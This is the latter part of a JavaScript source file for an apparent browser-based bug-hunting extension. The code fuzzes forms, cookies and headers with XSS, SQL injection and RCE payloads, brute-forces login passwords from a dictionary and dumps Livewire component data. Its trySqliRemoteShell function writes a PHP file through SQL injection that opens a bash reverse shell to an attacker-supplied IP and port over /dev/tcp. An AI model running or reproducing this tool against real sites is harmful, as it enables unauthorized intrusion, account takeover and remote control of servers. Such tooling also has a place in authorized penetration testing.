      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Laravel Url Finder</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url Found</th></tr>';

      laravelAccessibleUrls.forEach((v) => {
        gui += '<tr><td><a href="' + v + '" onclick="Livewire.components.componentsById.' + v + '">' + htmlEntities(v) + '</a></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }

    if (this.bruteforcerEnabled === true) {
      console.log('Bruteforcer'.toUpperCase());
      const passwords = await bruteforcePasswords.call(this);
      console.log(passwords);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Bruteforcer</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Password Found</th></tr>';

      passwords.forEach((password) => {
        gui += '<tr><td>' + htmlEntities(password) + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';
      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }
    if (this.formFuzzingEnabled === true) {
      console.log('Form Vulnerabilities'.toUpperCase());

      const form = await formLoop.call(this);
      console.log(form);

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Form Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';
      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

      // url: this.url, httpMethod: this.httpMethod, paramName: modParams[i][0], paramValue: modParams[i][1], payloadType: this.payloadType
      form.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td>' + tryRemoteShellLink(v) + '</td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';

      console.log('----------------------------------------------------------------------------');
      console.log('\n');
    }
    console.log('\n');
    console.log('----------------------------------------------------------');
    console.log('Created by Davide Cavallini');
    console.log('Linkedin: https://www.linkedin.com/in/davidecavallini/');

    guiEnabled(gui);
  };

  // eslint-disable-next-line no-extend-native
  String.prototype.hexEncode = function () {
    let hex = '';
    let result = '';
    for (let i = 0; i < this.length; i++) {
      hex = this.charCodeAt(i).toString(16);
      result += ('000' + hex).slice(-2);
    }

    return result;
  };

  // eslint-disable-next-line no-extend-native
  String.prototype.replaceLast = function (find, replace) {
    const index = this.lastIndexOf(find);

    if (index >= 0) {
      return this.substring(0, index) + replace + this.substring(index + find.length);
    }

    return this.toString();
  };

  // eslint-disable-next-line no-unused-vars
  this.manualFuzzer = async function (manualFuzzerUrl, manualFuzzerMethod, manualFuzzerParams) {
    try {
      const params = Object.entries(JSON.parse(manualFuzzerParams));

      const originalParamLength = params.length;

      let result = [];
      result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'pageParams', manualFuzzerMethod, params));
      result = result.filter((v) => v.paramName !== undefined);

      console.log(result);

      let gui = '';

      let accordionNumber = 0;

      accordionNumber++;
      gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Form Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

      gui += '<table class="table table-responsive table-hover">';

      gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

      result.forEach((v) => {
        gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>';
      });

      gui += '</table>';

      gui += '</div></div></div>';

      // this is not an else if because can be more than 1 choice
      if (this.cookiesFuzzerEnabled === true) {
        result = [];
        result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'cookiesParams', manualFuzzerMethod, params));
        result = result.filter((v) => v.paramName !== undefined);

        console.log(result);

        accordionNumber++;
        gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Cookies Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

        gui += '<table class="table table-responsive table-hover">';

        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

        result.forEach((v) => {
          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>';
        });

        gui += '</table>';

        gui += '</div></div></div>';
      }

      if (this.headersFuzzerEnabled === true) {
        result = [];
        result = result.concat(await fuzzer.call(this, originalParamLength, manualFuzzerUrl, 'headersParams', manualFuzzerMethod, params));
        result = result.filter((v) => v.paramName !== undefined);

        console.log(result);

        accordionNumber++;
        gui += '<div class="accordion-item"><h2 class="accordion-header" id="heading' + accordionNumber + '"> <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse' + accordionNumber + '" aria-expanded="true" aria-controls="collapse' + accordionNumber + '">Headers Vulnerabilities</button> </h2><div id="collapse' + accordionNumber + '" class="accordion-collapse collapse" aria-labelledby="heading' + accordionNumber + '" data-bs-parent="#accordionExample"><div class="accordion-body">';

        gui += '<table class="table table-responsive table-hover">';

        gui += '<tr><th>Url</th><th>HttpMethod</th><th>ParamName</th><th>ParamValue</th><th>PayloadType</th><th>Remote Shell</th></tr>';

        result.forEach((v) => {
          gui += '<tr><td>' + htmlEntities(v.url) + '</td><td>' + htmlEntities(v.httpMethod) + '</td><td>' + htmlEntities(v.paramName) + '</td><td>' + htmlEntities(v.paramValue) + '</td><td>' + htmlEntities(v.payloadType) + '</td><td></td></tr>';
        });

        gui += '</table>';

        gui += '</div></div></div>';
      }

      guiEnabled(gui);
    } catch (e) {
      alert(e);
    }
  };

  this.spider = async function () {
    const initialUrl = document.location.href;
    const urls = [];
    await recursion(initialUrl, 0);
    let gui = '<table style="overflow:auto" class="table table-responsive table-striped table-hover">';
    urls.forEach((v) => {
      gui += '<tr><td><a href="' + v + '" target="_blank">' + v + '</a></td></tr>';
    });
    gui += '</table>';
    guiEnabled(gui);
    // console.log('SPIDER', urls)
    return urls;

    async function recursion(url, depth) {
      const data = await $.get(url);
      // console.log(url, $(data), $(data).find('a'))

      depth++;

      for (const tmp of $(data).find('a')) {
        if (tmp !== undefined && tmp.href !== undefined) {
          if (urls.findIndex((element) => element === tmp.href) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
            urls.push(tmp.href);
            try {
              console.log('r', tmp.href);
              await recursion(tmp.href, depth);
            } catch (e) { }
          }
        }
      }
      for (const tmp of $(data).find('script')) {
        if (tmp !== undefined && tmp.src !== undefined) {
          if (urls.findIndex((element) => element === tmp.src) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
            urls.push(tmp.src);
            try {
              console.log('r', tmp.src);
              await recursion(tmp.src, depth);
            } catch (e) { }
          }
        }
      }
      for (const tmp of $(data).find('link')) {
        if (tmp !== undefined && tmp.href !== undefined) {
          if (urls.findIndex((element) => element === tmp.href) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
            urls.push(tmp.href);
            try {
              console.log('r', tmp.href);
              await recursion(tmp.href, depth);
            } catch (e) { }
          }
        }
      }
      for (const tmp of $(data).find('img')) {
        if (tmp !== undefined && tmp.src !== undefined) {
          if (urls.findIndex((element) => element === tmp.src) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
            urls.push(tmp.src);
            try {
              console.log('r', tmp.src);
              await recursion(tmp.src, depth);
            } catch (e) { }
          }
        }
      }
      for (const tmp of $(data).find('iframe')) {
        if (tmp !== undefined && tmp.src !== undefined) {
          if (urls.findIndex((element) => element === tmp.src) === -1 /* && tmp[0].indexOf(document.location.origin) !== -1 */) {
            urls.push(tmp.src);
            try {
              console.log('r', tmp.src);
              await recursion(tmp.src, depth);
            } catch (e) { }
          }
        }
      }
    }
  };

  function tryRemoteShellLink(v) {
    if (v.payloadType === 'SQL Injection' && v.paramValue.toLowerCase().indexOf('union') !== -1) {
      return '<a href="javascript:trySqliRemoteShell(\'' + btoa(JSON.stringify(v)) + '\')">Try</a>';
    }
    return '';
  }


  async function trySqliRemoteShell(base64v) {
    const attackerIp = $('#attackerIp').val();
    const attackerPort = $('#attackerPort').val();

    if (attackerIp === '' || attackerPort === '') {
      alert('Please insert your attacker ip and port');
      return false;
    }

    const fileName = new Date().getTime() + '.php';

    const payloads = [
      { filePlace: 'c:/var/www/' + fileName, payload: '<?php exec("bash.exe -c \\"bash.exe -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\\"");?>' },
      { filePlace: '/var/www/' + fileName, payload: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\'");?>' },
      { filePlace: '/var/www/html/' + fileName, payload: '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/' + attackerIp + '/' + attackerPort + ' 0>&1\'");?>' },
    ];

    alert('Run netcat -lvnp PORT (or ncat -lvnp PORT in windows) on your computer');
    const initialPayload = JSON.parse(atob(base64v));

    for (const pl of payloads) {
      // capire perchè su sql4 non va
      const stringPayload = pl.payload;
      const hexPayload = stringPayload.hexEncode();

      let newPayload = '';
      if (initialPayload.paramValue.indexOf('"918273645"') !== -1) {
        newPayload = initialPayload.paramValue.replaceLast('"918273645', '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #');
      } else if (initialPayload.paramValue.indexOf('\'918273645\'') !== -1) {
        newPayload = initialPayload.paramValue.replaceLast('\'918273645', '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #');
      } else if (initialPayload.paramValue.indexOf('918273645') !== -1) {
        newPayload = initialPayload.paramValue.replaceLast('918273645', '0x' + hexPayload + ' INTO DUMPFILE \'' + pl.filePlace + '\' #');
      }

      console.log('initialPayload', newPayload);

      // eslint-disable-next-line no-unused-vars
      const name = initialPayload.paramName;
      const value = newPayload;

      let tempParams = [];
      $('form').each((i, form) => {
        $(form).find('input,button,select,textarea').each((i2, v2) => {
          if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
            // eslint-disable-next-line no-undef
            // console.log($(v2).attr('name'), $(v2).val())
            const tagName = $(v2)[0].tagName;
            let value = '';

            if (tagName === 'SELECT') {
              value = $(v2).find('option:selected').val();
            } else if (tagName === 'INPUT') {
              const type = $(v2).attr('type').toLowerCase();
              if (type === 'checkbox' || type === 'radio') {
                value = $(v2).prop('checked').toString();
              } else {
                value = $(v2).val();
              }
            }
            tempParams.push([$(v2).attr('name'), value]);
          }
        });
      });

      tempParams = tempParams.filter((v, i) => {
        return v[0] !== name;
      });

      tempParams.push([name, value]);

      await $.ajax(initialPayload.url, {
        type: initialPayload.httpMethod,
        data: Object.fromEntries(tempParams),
      }).done((data) => {
        // console.log(data)
        $.get(window.location.origin + '/' + fileName).done(() => {
        });
      });
    }
  }

  function cookieToTouple() {
    return document.cookie.split(';').map((v) => v.split('='));
  }

  function headersToTouple(headers) {
    let headersObj = {};
    try {
      headersObj = JSON.parse(headers);
    } catch (e) {
      console.log(e);
    }
    return Object.entries(headersObj);
  }

  function guiEnabled(gui) {
    $('#guiModal #accordionExample').html(gui);

    document.getElementById('openGuiButton').disabled = false;
    document.getElementById('openGuiButton').innerHTML = 'OPEN GUI';
  }

  function htmlEntities(str) {
    return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function getAllUrlParams(url) {
    // get query string from url (optional) or window
    let queryString = url ? url.split('?')[1] : window.location.search.slice(1);

    // we'll store the parameters here
    const obj = {};

    // if query string exists
    if (queryString) {
      // stuff after # is not part of query string, so get rid of it
      queryString = queryString.split('#')[0];

      // split our query string into its component parts
      const arr = queryString.split('&');

      for (let i = 0; i < arr.length; i++) {
        // separate the keys and the values
        const a = arr[i].split('=');

        // set parameter name and value (use 'true' if empty)
        const paramName = a[0];
        const paramValue = typeof (a[1]) === 'undefined' ? true : a[1];

        // (optional) keep case consistent
        /* paramName = paramName.toLowerCase()
          if (typeof paramValue === 'string') paramValue = paramValue.toLowerCase() */

        // if the paramName ends with square brackets, e.g. colors[] or colors[2]
        if (paramName.match(/\[(\d+)?\]$/)) {
          // create key if it doesn't exist
          const key = paramName.replace(/\[(\d+)?\]/, '');
          if (!obj[key]) obj[key] = [];

          // if it's an indexed array e.g. colors[2]
          if (paramName.match(/\[\d+\]$/)) {
            // get the index value and add the entry at the appropriate position
            const index = /\[(\d+)\]/.exec(paramName)[1];
            obj[key][index] = paramValue;
          } else {
            // otherwise add the value to the end of the array
            obj[key].push(paramValue);
          }
        } else {
          // we're dealing with a string
          if (!obj[paramName]) {
            // if it doesn't exist, create property
            obj[paramName] = paramValue;
          } else if (obj[paramName] && typeof obj[paramName] === 'string') {
            // if property does exist and it's a string, convert it to an array
            obj[paramName] = [obj[paramName]];
            obj[paramName].push(paramValue);
          } else {
            // otherwise add the property
            obj[paramName].push(paramValue);
          }
        }
      }
    }

    return obj;
  }

  /**
 * Gets all event-handlers from a DOM element.
 * Events with namespace are allowed.
 *
 * @param  {Element} node: DOM element
 * @param  {String} eventns: (optional) name of the event/namespace
 * @return {Object}
 */
  function getjQueryEventHandlers(element, eventns) {
    const $ = this.originalWinObj.jQuery;
    // const $ = window.wrappedJSObject.jQuery
    // const $ = window.jQuery
    // const $ = jQuery
    const i = (eventns || '').indexOf('.');
    const event = i > -1 ? eventns.substr(0, i) : eventns;
    // eslint-disable-next-line no-void
    const namespace = i > -1 ? eventns.substr(i + 1) : void (0);
    const handlers = Object.create(null);
    element = $(element);
    if (!element.length) return handlers;
    // gets the events associated to a DOM element
    const listeners = $._data(element.get(0), 'events') || handlers;
    const events = event ? [event] : Object.keys(listeners);
    if (!eventns) return listeners; // Object with all event types
    events.forEach((type) => {
      // gets event-handlers by event-type or namespace
      (listeners[type] || []).forEach(getHandlers, type);
    });
    // eslint-disable-next-line
    function getHandlers(e) {
      const type = this.toString();
      const eNamespace = e.namespace || (e.data && e.data.handler);
      // gets event-handlers by event-type or namespace
      if ((event === type && !namespace) ||
        (eNamespace === namespace && !event) ||
        (eNamespace === namespace && event === type)) {
        handlers[type] = handlers[type] || [];
        handlers[type].push(e);
      }
    }
    return handlers;
  }

  function searchJqueryListeners() {
    const jQueryListeners = [];
    // eslint-disable-next-line no-undef
    // eslint-disable-next-line no-undef
    $('*').each((i, v) => {
      /* if (v.id === 'div_share_close') {
        console.log(v)
      } */

      const elementListeners = getjQueryEventHandlers.call(this, v);
      // console.log('elementListeners', jQueryListeners)

      // console.log(v)
      if (Object.keys(elementListeners).length > 0) {
        jQueryListeners.push(elementListeners);
      }
    });

    // console.log('jQueryListeners', jQueryListeners)
    return recursiveEnumerate(jQueryListeners, 0);
  }

  function listAllEventListeners() {
    const allElements = Array.prototype.slice.call(document.querySelectorAll('*'));
    allElements.push(document);
    allElements.push(this.originalWinObj);

    const types = [];

    for (const ev in this.originalWinObj) {
      if (/^on/.test(ev)) types[types.length] = ev;
    }

    const elements = [];
    for (let i = 0; i < allElements.length; i++) {
      const currentElement = allElements[i];
      for (let j = 0; j < types.length; j++) {
        if (typeof currentElement[types[j]] === 'function') {
          elements.push(currentElement[types[j]]);
        }
      }
    }

    return elements;
  }

  function regEx(string, regEx) {
    const index = [];
    const regex1 = RegExp(regEx, 'gim');
    const str1 = string;
    let array1 = [];

    while ((array1 = regex1.exec(str1)) !== null) {
      index.push(array1.index);
    }
    return index;
  }

  function getAllIndexes(arr, val) {
    const indexes = [];
    let i = -1;
    while ((i = arr.indexOf(val, i + 1)) !== -1) {
      indexes.push(i);
    }
    return indexes;
  }

  function searchInside(functionToString, object, objKeys, o, resultTmp) {
    let result = [];
    if (resultTmp !== undefined) {
      result = resultTmp;
    }

    if (objKeys[o] === undefined) {
      objKeys[o] = '';
    }
    if (object[objKeys[o]] === undefined) {
      object[objKeys[o]] = '';
    }

    searchElements.forEach((v) => {
      if (v.type === 'string') {
        const index = getAllIndexes(functionToString, v.string);
        index.forEach((ind) => {
          result.push({ description: v.description, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) });
          // console.log(result)
        });
      } else if (v.type === 'regEx') {
        // console.log('REGEX')
        const index = regEx(functionToString, v.string);
        // console.log('regEx Index', index)
        index.forEach((ind) => {
          if (objKeys[o] !== 'string') {
            result.push({ description: v.description, name: objKeys[o], function: object[objKeys[o]], declaration: functionToString.substr(ind - 15, 60) });
            // console.log(result)
          }
        });
      }
    });
    if (resultTmp === undefined) {
      return result;
    }
  }

  function recursiveEnumerate(object, level) {
    function recursion(object, level) {
      level++;
      const objKeys = Object.keys(object);
      // console.log("A", object)

      for (let o = 0; o < objKeys.length; o++) {
        // imposto massimo livello di ricorsione a 5 per evitare overflows
        if (level < 4 && object[objKeys[o]] !== null && (typeof object[objKeys[o]] === 'function' || typeof object[objKeys[o]] === 'object') && objKeys[o] !== '$' && objKeys[o] !== 'location' && objKeys[o] !== 'jQuery' && objKeys[o] !== 'JsBugHuntingHelper' && objKeys[o] !== 'recursion' && objKeys[o] !== 'recursiveEnumerate' && objKeys[o] !== 'alreadyProcessedFunctions' && objKeys[o] !== 'jsHuntingHelper') {
          // rivedere sta cosa perchè mi elenca solo le funzioni interne
          if (objKeys[o] !== 'fn') {
            try {
              const functionToString = object[objKeys[o]].toString().replace(/(\r\n|\n|\r)/gm, '').replace(/\s\s+/g, ' ');

              // console.log("B", functionToString)

              if (alreadyProcessedFunctions.indexOf(functionToString) === -1) {
                // console.log("C", functionToString)
                searchInside(functionToString, object, objKeys, o, result);
                if (functionToString.indexOf('[object Object]') === -1) {
                  alreadyProcessedFunctions.push(functionToString);
                }

                if (objKeys[o] !== 'set' && objKeys[o] !== 'push') {
                  recursion(object[objKeys[o]], level);
                }
              }
            } catch (reason) {
              console.log(reason);
            }
          }
        }
      }
    }

    const result = [];
    const alreadyProcessedFunctions = [];
    recursion(object, level);
    // console.log('2', result)
    return result;
  }

  async function getPageHeaders(url) {
    return new Promise((resolve, reject) => {
      // eslint-disable-next-line no-undef
      const xhr = $.ajax({
        type: 'GET',
        url,
        success: function () {
          resolve(xhr.getAllResponseHeaders());
        },
        error: function () {
          resolve(false);
        },
      });
    });
  }

  function removeBootstrapDuplicatedStyles(classToRemove) {
    // for example .fade
    if (document.wrappedJSObject !== undefined) {
      try {
        // Loop through the stylesheets...
        $.each(document.styleSheets, function (_, sheet) {
          // Loop through the rules...
          let keepGoing = true;
          $.each(sheet.cssRules || sheet.rules, function (index, rule) {
            // Is this the rule we want to delete?
            if (rule.selectorText === classToRemove) {
              // Yes, do it and stop looping
              sheet.deleteRule(index);
              keepGoing = false;
              return keepGoing;
            }
          });
          return keepGoing;
        });
      } catch (e) {

      }
    }
  }

  async function testCookies() {
    const result = [];

    const paramsEntities = Object.entries(getAllUrlParams(document.location.href));
    for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
      if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
        (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
        (this.rceScanEnabled === true && payload.type === 'RCE')) {
        const url = document.location.origin + document.location.pathname;

        const r = await new Payload(
          url,
          'cookiesParams',
          'GET',
          paramsEntities,
          payload.previousAction,
          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
          // eslint-disable-next-line no-useless-escape
          payload.expectedResult,
          payload.type,
          headersToTouple(this.customHeaders),
          cookieToTouple(),
        ).isValidResponse();
        if (r !== false) {
          result.push(r);
        }
      }
    }

    return result;
  }

  async function testHeaders() {
    const result = [];

    const paramsEntities = Object.entries(getAllUrlParams(document.location.href));
    for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
      if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
        (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
        (this.rceScanEnabled === true && payload.type === 'RCE')) {
        const url = document.location.origin + document.location.pathname;

        const r = await new Payload(
          url,
          'headersParams',
          'GET',
          paramsEntities,
          payload.previousAction,
          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
          // eslint-disable-next-line no-useless-escape
          payload.expectedResult,
          payload.type,
          headersToTouple(this.customHeaders),
          cookieToTouple(),
        ).isValidResponse();
        if (r !== false) {
          result.push(r);
        }
      }
    }
    return result;
  }

  async function testXSS() {
    const result = [];
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href));
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsXSS) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href));
        const newUrl2 = document.location.origin + document.location.pathname;

        const r = await new Payload(
          newUrl2,
          'pageParams',
          'GET',
          paramsEntities,
          payload.previousAction,
          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
          // eslint-disable-next-line no-useless-escape
          payload.expectedResult,
          'XSS',
          headersToTouple(this.customHeaders),
          {},
        ).isValidResponse();
        if (r !== false) {
          result.push(r);
        }
      }
    }
    return result;
  }

  async function testSqlInjection() {
    const result = [];
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href));
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsSQLi) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href));
        const newUrl2 = document.location.origin + document.location.pathname;

        const r = await new Payload(
          newUrl2,
          'pageParams',
          'GET',
          paramsEntities,
          payload.previousAction,
          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
          // eslint-disable-next-line no-useless-escape
          payload.expectedResult,
          'SQL Injection',
          headersToTouple(this.customHeaders),
          {},
        ).isValidResponse();
        if (r !== false) {
          result.push(r);
        }
      }
    }
    return result;
  }

  async function testLaravelAccessibleUrls() {

    const result = [];
    const urls = new laravelAccessibleUrls().getUrls();

    for (const url of urls) {

      const absoluteUrl = window.location.origin;
      const pathName = window.location.pathname;

      const pathNameArray = pathName.split('/');

      console.log(absoluteUrl);

      for (let i = 0; i < pathNameArray.length; i++) {

        const finalPath = pathNameArray.slice(0, i).join('/');
        const finalUrl = absoluteUrl + finalPath + url;

        console.log(finalUrl);

        try {
          const data = await $.ajax({
            url: finalUrl,
            //data: { 'email': this.bruteforcerEmail, 'password': password },
            //type: 'POST', il metodo può anche cambiare
          });

          console.log('DONE');

          result.push(finalUrl);

        } catch (error) {
          console.log('FAIL', error);
        }
      }
    }
    return result;
  }

  async function testLivewireComponents() {
    const result = [];
    const win = this.originalWinObj;
    if (win.Livewire !== undefined) {
      Object.values(win.Livewire.components.componentsById).forEach(function (v) {
        try {
          console.log(v.id, v.listeners, v.serverMemo.data, v.serverMemo.dataMeta.models);

          let data = '';
          Object.entries(v.serverMemo.data).forEach(function (v, i) {
            data += v[0] + ':' + v[1] + '<br>';
          });

          let models = '';
          if (v.serverMemo.dataMeta.models !== undefined) {
            Object.entries(v.serverMemo.dataMeta.models).forEach(function (v) {
              Object.entries(v[1]).forEach(function (sv) {
                models += v[0] + ' - ' + sv[0] + ':' + sv[1] + '<br>';
              });
            });
          }
          result.push({ 'id': v.id, 'listeners': v.listeners, 'data': data, 'models': models });
        } catch (e) {
          console.log('Livewire Error', e);
        }
      });
      console.log('Livewire Result', result);
    }
    return result;
  }

  async function bruteforcePasswords() {
    let foundPasswords = [];
    const dictionary = new Dictionary();
    const passwords = dictionary.getDictionary();//.slice(60);

    for (const password of passwords) {
      try {
        const data = await $.ajax({
          url: this.bruteforcerUrl,
          data: { 'email': this.bruteforcerEmail, 'password': password },
          type: 'POST',
        });

        console.log('DONE', data.status == '200');

        if (data.status == '200') {
          foundPasswords.push(password);
          break; // Termina il ciclo for quando una password viene trovata
        }
      } catch (error) {
        console.log('FAIL', error);
      }
    }

    return foundPasswords;
  }

  async function testRCE() {
    const result = [];
    const paramsEntitiesTemp = Object.entries(getAllUrlParams(document.location.href));
    // console.log(paramsEntities)
    for (let i = 0; i < paramsEntitiesTemp.length; i++) {
      for (const payload of payloadsRCE) {
        const paramsEntities = Object.entries(getAllUrlParams(document.location.href));
        const newUrl2 = document.location.origin + document.location.pathname;

        const r = await new Payload(
          newUrl2,
          'pageParams',
          'GET',
          paramsEntities,
          payload.previousAction,
          payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
          // eslint-disable-next-line no-useless-escape
          payload.expectedResult,
          'RCE',
          headersToTouple(this.customHeaders),
          {},
        ).isValidResponse();
        if (r !== false) {
          result.push(r);
        }
      }
    }
    return result;
  }

  function Q(root, selector) {
    if (typeof root === 'string') {
      selector = root;
      root = document;
    }
    return root.querySelectorAll(selector);
  }

  // fuzz all forms in the webpage
  async function formLoop() {
    let result = [];
    // eslint-disable-next-line no-undef
    // probabilmente il problema è questo async
    for (const form of Q('form')) {
      const originalParamsLength = $(form).find('input,button,select,textarea').length;
      let url = $(form).attr('action');
      if (url === undefined || url === '') {
        url = this.originalWinObj.location.href;
      } else if (url.substr(0, 4) !== 'http') {
        let b = this.originalWinObj.location.href.split('/').slice(0, -1).join('/');
        if (url[0] !== '/') {
          b += '/';
        }
        url = b + url;
      }

      let method = 'GET';
      if ($(form).attr('method') === 'POST' || $(form).attr('method') === 'post' || $(form).attr('method') === '$_POST' || $(form).attr('method') === '$_post') {
        method = 'POST';
      }

      const tempParams = [];
      // eslint-disable-next-line no-undef
      $(form).find('input,button,select,textarea').each((i2, v2) => {
        if ($(v2).attr('name') !== undefined && $(v2).attr('name') !== 'undefined' && $(v2).attr('name') !== '') {
          // eslint-disable-next-line no-undef
          // console.log($(v2).attr('name'), $(v2).val())
          const tagName = $(v2)[0].tagName;
          let value = '';

          if (tagName === 'SELECT') {
            value = $(v2).find('option:selected').val();
          } else if (tagName === 'INPUT') {
            const type = $(v2).attr('type').toLowerCase();
            if (type === 'checkbox' || type === 'radio') {
              value = $(v2).prop('checked').toString();
            } else {
              value = $(v2).val();
            }
          }
          tempParams.push([$(v2).attr('name'), value]);
        }
      });

      const paramsEntities = tempParams;

      result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'pageParams', method, paramsEntities));
      // this is not an else if because can be more than 1 choice
      if (this.cookiesFuzzerEnabled === true) {
        result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'cookiesParams', method, paramsEntities));
      }
      if (this.headersFuzzerEnabled === true) {
        result = result.concat(await fuzzer.call(this, originalParamsLength, url, 'headersParams', method, paramsEntities));
      }
    }
    // console.log('FF', result)
    return result.filter((v) => v.paramName !== undefined);
  }

  async function fuzzer(originalParamsLength, url, type, method, paramsEntities) {
    const result = [];

    for (let i = 0; i < originalParamsLength; i++) {
      for (const payload of payloadsXSS.concat(payloadsSQLi).concat(payloadsRCE)) {
        if ((this.xssScanEnabled === true && payload.type === 'XSS') ||
          (this.sqlInjectionScanEnabled === true && payload.type === 'SQL Injection') ||
          (this.rceScanEnabled === true && payload.type === 'RCE')) {
          const r = await new Payload(
            url,
            type,
            method,
            paramsEntities,
            payload.previousAction,
            payload.payloadString.replace('[ATTACKERIP]', this.attackerIp).replace('[ATTACKERPORT]', this.attackerPort),
            // eslint-disable-next-line no-useless-escape
            payload.expectedResult,
            payload.type,
            headersToTouple(this.customHeaders),
            cookieToTouple(),
          ).isValidResponse();
          if (r !== false) {
            result.push(r);
          }
        }
      }
    }
    return result;
  }
}

// eslint-disable-next-line no-var, no-unused-vars
var jBHH = new JsBugHuntingHelper();
